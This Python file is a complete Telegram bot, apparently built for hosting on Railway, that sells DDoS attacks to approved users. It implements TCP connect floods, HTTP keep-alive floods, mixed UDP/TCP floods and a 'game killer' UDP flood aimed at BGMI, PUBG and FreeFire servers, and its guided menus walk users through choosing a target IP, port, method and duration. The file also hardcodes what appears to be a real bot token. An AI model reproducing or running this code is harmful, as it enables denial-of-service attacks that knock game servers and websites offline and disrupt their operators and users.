# bot.py - Complete Railway DDoS Bot (Game KILLER)
import asyncio
import threading
import time
import random
import socket
import ssl
import re
import os
import json
from datetime import datetime, timedelta
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ CONFIGURATION ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 8210011971))]

BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}

# ============ POWERFUL ATTACK SETTINGS ============
class AttackConfig:
    def __init__(self):
        self.threads = 120          # Railway safe max
        self.packet_size = 1024
        self.delay = 0.00005
        self.http_threads = 80
        self.tcp_threads = 100

config = AttackConfig()

# Global attack state
attack_running = False
attack_stats = {'packets': 0, 'target': '', 'method': '', 'start': 0, 'duration': 0}
stats_lock = threading.Lock()
user_data = {}

# ============ SIMPLE DATABASE ============
USERS_FILE = "users.json"
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)
def is_approved(uid):
    users = load_users()
    return users.get(str(uid), {}).get('approved', False)
def approve_user(uid, days):
    users = load_users()
    users[str(uid)] = {'approved': True, 'expires': (datetime.now() + timedelta(days=days)).isoformat()}
    save_users(users)

# ============ PROFESSIONAL ATTACK ENGINES ============
def tcp_syn_flood(ip, port):
    """TCP SYN flood - kills connection queues"""
    global attack_running, attack_stats
    while attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect_ex((ip, port))
            sock.send(b'\x00' * 100)
            sock.close()
            with stats_lock:
                attack_stats['packets'] += 1
            time.sleep(config.delay)
        except:
            time.sleep(0.001)

def http2_flood(ip, port):
    """HTTP/2 like flood with keep-alive"""
    global attack_running, attack_stats
    url = f"http://{ip}:{port}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
    }
    session = requests.Session()
    while attack_running:
        try:
            resp = session.get(url, headers=headers, timeout=1)
            resp.close()
            with stats_lock:
                attack_stats['packets'] += 1
            time.sleep(0.001)
        except:
            time.sleep(0.01)
    session.close()

def mixed_flood(ip, port):
    """UDP + TCP mixed for maximum impact"""
    global attack_running, attack_stats
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(512)
    while attack_running:
        try:
            # UDP packet
            udp_sock.sendto(payload, (ip, port))
            # TCP SYN quickly after
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp.settimeout(0.005)
            tcp.connect_ex((ip, port))
            tcp.close()
            with stats_lock:
                attack_stats['packets'] += 2
            time.sleep(config.delay)
        except:
            time.sleep(0.001)
    udp_sock.close()

def game_killer_flood(ip, port):
    """Specialized flood for game servers - sends malformed packets"""
    global attack_running, attack_stats
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Game-specific payloads
    payloads = [
        b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00',
        random._urandom(1024),
        b'\x00' * 500,
        b'\x01' * 500,
        b'\xff' * 500
    ]
    while attack_running:
        for payload in payloads:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
                time.sleep(config.delay)
            except:
                pass
    sock.close()

# ============ ATTACK LAUNCHER ============
def start_attack(ip, port, duration, method, send_callback):
    global attack_running, attack_stats
    
    attack_running = True
    with stats_lock:
        attack_stats = {
            'packets': 0,
            'target': f"{ip}:{port}",
            'method': method,
            'start': time.time(),
            'duration': duration
        }
    
    # Select attack function
    if method == 'tcp':
        attack_func = tcp_syn_flood
        threads = config.tcp_threads
    elif method == 'http':
        attack_func = http2_flood
        threads = config.http_threads
    elif method == 'game':
        attack_func = game_killer_flood
        threads = config.threads
    else:  # mixed
        attack_func = mixed_flood
        threads = config.threads
    
    # Launch threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack_func, args=(ip, port), daemon=True)
        t.start()
        thread_list.append(t)
    
    # Monitor progress
    start_time = time.time()
    last_update = 0
    keyboard = [
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
    ]
    
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(1)
        if time.time() - last_update >= 2:
            last_update = time.time()
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            with stats_lock:
                pkt = attack_stats['packets']
            speed = int(pkt / elapsed) if elapsed > 0 else 0
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            
            msg = (
                f"💀 *ATTACK IN PROGRESS* 💀\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"🧵 Threads: `{threads}`\n\n"
                f"🔘 *Use buttons below to control*"
            )
            send_callback(msg, InlineKeyboardMarkup(keyboard))
    
    # Attack finished
    attack_running = False
    for t in thread_list:
        t.join(timeout=0.5)
    
    with stats_lock:
        pkt = attack_stats['packets']
    avg_speed = int(pkt / duration) if duration else 0
    completion_msg = (
        f"✅ *ATTACK COMPLETED* ✅\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"📦 Total Packets: `{pkt:,}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"💥 Avg Speed: `{avg_speed:,}` pps\n\n"
        f"_Target should be experiencing issues_"
    )
    send_callback(completion_msg, None)

# ============ TELEGRAM HANDLERS (Professional UI) ============
async def start_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid) and uid not in ADMIN_IDS:
        await update.message.reply_text("❌ *Access Denied*\nContact admin for approval.", parse_mode='Markdown')
        return
    
    # Create info keyboard
    keyboard = [
        [InlineKeyboardButton("📖 HOW TO USE", callback_data="howto")],
        [InlineKeyboardButton("⚙️ ATTACK METHODS", callback_data="methods")],
        [InlineKeyboardButton("🎮 GAME KILLER MODE", callback_data="gamemode")],
        [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")]
    ]
    await update.message.reply_text(
        "🔥 *PROFESSIONAL DDoS BOT* 🔥\n\n"
        "⚡ *Features:*\n"
        "• TCP SYN Flood (kills connections)\n"
        "• HTTP/2 Flood (web servers)\n"
        "• Game Killer Mode (BGMI/FreeFire/PUBG)\n"
        "• Mixed UDP+TCP Attack\n\n"
        "📊 *Current Settings:*\n"
        f"├ Threads: `{config.threads}`\n"
        f"├ Packet Size: `{config.packet_size}` bytes\n"
        f"└ Delay: `{config.delay}` sec\n\n"
        "👇 *Use buttons below* 👇",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update, context):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    # ============ INFO BUTTONS ============
    if data == "howto":
        text = (
            "📖 *HOW TO USE*\n\n"
            "1️⃣ Click *START ATTACK* button\n"
            "2️⃣ Enter target IP address\n"
            "3️⃣ Enter port number (1-65535)\n"
            "4️⃣ Select attack method:\n"
            "   • TCP - Best for game servers\n"
            "   • HTTP - Best for websites\n"
            "   • GAME - Special for BGMI/PUBG\n"
            "   • MIXED - UDP+TCP combined\n"
            "5️⃣ Enter duration (5-300 seconds)\n"
            "6️⃣ Confirm and attack starts!\n\n"
            "⚡ *During attack:* Use STOP/INFO/REFRESH buttons"
        )
        await query.edit_message_text(text, parse_mode='Markdown')
        await asyncio.sleep(5)
        await query.delete_message()
    
    elif data == "methods":
        text = (
            "⚙️ *ATTACK METHODS*\n\n"
            "🔹 *TCP SYN Flood*\n"
            "   • Fills connection queue\n"
            "   • Best for game servers\n"
            "   • Speed: Very High\n\n"
            "🔹 *HTTP/2 Flood*\n"
            "   • Web server killer\n"
            "   • Uses keep-alive connections\n"
            "   • Speed: High\n\n"
            "🔹 *Game Killer Mode*\n"
            "   • Special for BGMI/PUBG\n"
            "   • Sends malformed packets\n"
            "   • Speed: Ultra High\n\n"
            "🔹 *Mixed UDP+TCP*\n"
            "   • Combined attack\n"
            "   • Maximum impact\n"
            "   • Speed: Maximum"
        )
        await query.edit_message_text(text, parse_mode='Markdown')
        await asyncio.sleep(5)
        await query.delete_message()
    
    elif data == "gamemode":
        text = (
            "🎮 *GAME KILLER MODE*\n\n"
            "This mode is specifically optimized for:\n"
            "• BGMI (Battlegrounds Mobile India)\n"
            "• PUBG Mobile\n"
            "• FreeFire\n"
            "• Call of Duty Mobile\n\n"
            "*How it works:*\n"
            "1. Sends malformed UDP packets\n"
            "2. Floods game protocol ports\n"
            "3. Causes mass disconnection\n\n"
            "⚠️ *Use on your own servers only!*"
        )
        await query.edit_message_text(text, parse_mode='Markdown')
        await asyncio.sleep(5)
        await query.delete_message()
    
    # ============ START ATTACK SETUP ============
    elif data == "start_attack":
        user_data[uid] = {'step': 'ip'}
        await query.edit_message_text(
            "🎯 *TARGET IP*\n\n"
            "Send target IP address:\n"
            "Example: `192.168.1.100` or `34.120.10.45`\n\n"
            "💡 *Tip:* For BGMI, use the game server IP from PCAPdroid",
            parse_mode='Markdown'
        )
    
    # ============ ATTACK CONTROL BUTTONS ============
    elif data == "stop_attack":
        global attack_running
        attack_running = False
        await query.edit_message_text("🛑 *Attack stopped by user*", parse_mode='Markdown')
    
    elif data == "info_attack":
        if attack_running:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start'])
                remaining = attack_stats['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
                text = (
                    f"ℹ️ *LIVE ATTACK INFO*\n\n"
                    f"🎯 Target: `{attack_stats['target']}`\n"
                    f"⚙️ Method: `{attack_stats['method'].upper()}`\n"
                    f"📦 Packets sent: `{pkt:,}`\n"
                    f"⏱️ Remaining: `{remaining}s`\n"
                    f"💥 Current speed: `{speed:,}` pps\n"
                    f"🔋 Status: `ACTIVE`"
                )
                await query.edit_message_text(text, parse_mode='Markdown')
        else:
            await query.answer("No active attack!")
    
    elif data == "refresh_attack":
        if attack_running:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start'])
                remaining = attack_stats['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
                progress = int((elapsed / attack_stats['duration']) * 20)
                bar = "█" * progress + "░" * (20 - progress)
                text = (
                    f"💀 *ATTACK ACTIVE* 💀\n\n"
                    f"🎯 `{attack_stats['target']}`\n"
                    f"📦 Packets: `{pkt:,}`\n"
                    f"⏱️ `{elapsed}/{attack_stats['duration']}s`\n"
                    f"📊 `[{bar}]`\n"
                    f"💥 Speed: `{speed:,}` pps\n\n"
                    f"👇 *Control buttons below*"
                )
                keyboard = [
                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
                ]
                await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text("✅ No active attack", parse_mode='Markdown')

async def handle_message(update, context):
    uid = update.effective_user.id
    if not is_approved(uid) and uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    text = update.message.text.strip()
    step_data = user_data.get(uid, {})
    step = step_data.get('step')
    
    if step == 'ip':
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
            await update.message.reply_text("❌ Invalid IP. Send again:")
            return
        step_data['ip'] = text
        step_data['step'] = 'port'
        user_data[uid] = step_data
        await update.message.reply_text(
            f"🔌 *PORT NUMBER*\n\n"
            f"Send port (1-65535):\n"
            f"Example: `8080` (BGMI), `80` (HTTP), `443` (HTTPS)\n\n"
            f"🚫 Blocked ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}",
            parse_mode='Markdown'
        )
    
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
                await update.message.reply_text("❌ Invalid or blocked port. Try again:")
                return
            step_data['port'] = port
            step_data['step'] = 'method'
            user_data[uid] = step_data
            
            keyboard = [
                [InlineKeyboardButton("🔹 TCP SYN Flood", callback_data="method_tcp")],
                [InlineKeyboardButton("🔸 HTTP/2 Flood", callback_data="method_http")],
                [InlineKeyboardButton("🎮 GAME KILLER", callback_data="method_game")],
                [InlineKeyboardButton("⚡ MIXED ATTACK", callback_data="method_mixed")]
            ]
            await update.message.reply_text(
                "⚔️ *SELECT ATTACK METHOD*\n\n"
                "Choose your weapon:",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            await update.message.reply_text("❌ Invalid port number:", parse_mode='Markdown')
    
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                await update.message.reply_text("❌ Duration must be 5-300 seconds")
                return
            ip = step_data['ip']
            port = step_data['port']
            method = step_data.get('method', 'mixed')
            del user_data[uid]
            
            keyboard = [
                [InlineKeyboardButton("💀 CONFIRM ATTACK", callback_data=f"confirm_{ip}_{port}_{duration}_{method}")],
                [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")]
            ]
            await update.message.reply_text(
                f"💀 *CONFIRM ATTACK* 💀\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"🧵 Threads: `{config.threads if method!='http' else config.http_threads}`\n\n"
                f"⚠️ *This will flood the target!*\n"
                f"Press CONFIRM to start:",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            await update.message.reply_text("❌ Invalid duration. Send number (5-300):", parse_mode='Markdown')

async def method_callback(update, context):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    if data.startswith("method_"):
        method = data.split("_")[1]
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]['method'] = method
        user_data[uid]['step'] = 'duration'
        await query.edit_message_text(
            f"✅ Method selected: `{method.upper()}`\n\n"
            f"⏱️ Send attack duration (5-300 seconds):",
            parse_mode='Markdown'
        )
    
    elif data.startswith("confirm_"):
        parts = data.split("_")
        ip = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        method = parts[4]
        
        if uid in user_data:
            del user_data[uid]
        
        await query.edit_message_text(
            f"💀 *ATTACK LAUNCHING* 💀\n\n"
            f"🎯 `{ip}:{port}`\n"
            f"⚙️ Method: `{method.upper()}`\n"
            f"⏱️ Duration: `{duration}s`\n\n"
            f"_Sending packets..._",
            parse_mode='Markdown'
        )
        
        loop = asyncio.get_event_loop()
        def send_update(msg, markup=None):
            asyncio.run_coroutine_threadsafe(
                query.message.reply_text(msg, parse_mode='Markdown', reply_markup=markup), 
                loop
            )
        
        threading.Thread(target=start_attack, args=(ip, port, duration, method, send_update), daemon=True).start()
    
    elif data == "cancel_attack":
        if uid in user_data:
            del user_data[uid]
        await query.edit_message_text("❌ Attack cancelled", parse_mode='Markdown')

async def stop_cmd(update, context):
    global attack_running
    attack_running = False
    await update.message.reply_text("🛑 *Attack stopped*", parse_mode='Markdown')

async def admin_approve(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return
    try:
        uid = int(context.args[0])
        days = int(context.args[1])
        approve_user(uid, days)
        await update.message.reply_text(f"✅ User {uid} approved for {days} days")
    except:
        await update.message.reply_text("❌ Invalid")

async def settings_cmd(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    if len(context.args) >= 2:
        option = context.args[0]
        value = int(context.args[1])
        if option == "threads":
            config.threads = min(value, 200)
            await update.message.reply_text(f"✅ Threads set to {config.threads}")
        elif option == "delay":
            config.delay = value / 1000000
            await update.message.reply_text(f"✅ Delay set to {config.delay} sec")
    else:
        await update.message.reply_text(
            f"⚙️ *Current Settings*\n\n"
            f"Threads: `{config.threads}`\n"
            f"HTTP Threads: `{config.http_threads}`\n"
            f"TCP Threads: `{config.tcp_threads}`\n"
            f"Packet Size: `{config.packet_size}`\n"
            f"Delay: `{config.delay}`\n\n"
            f"Usage: `/settings threads 150`",
            parse_mode='Markdown'
        )

# ============ MAIN ============
def main():
    print("=" * 60)
    print("🔥 PROFESSIONAL DDoS BOT DEPLOYING ON RAILWAY")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"⚙️ Config: {config.threads} threads, {config.delay} sec delay")
    print("=" * 60)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("approve", admin_approve))
    app.add_handler(CommandHandler("settings", settings_cmd))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(button_callback, pattern="^(howto|methods|gamemode|start_attack|stop_attack|info_attack|refresh_attack)$"))
    app.add_handler(CallbackQueryHandler(method_callback, pattern="^(method_|confirm_|cancel_attack)"))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ BOT IS LIVE! Send /start on Telegram")
    print("=" * 60)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
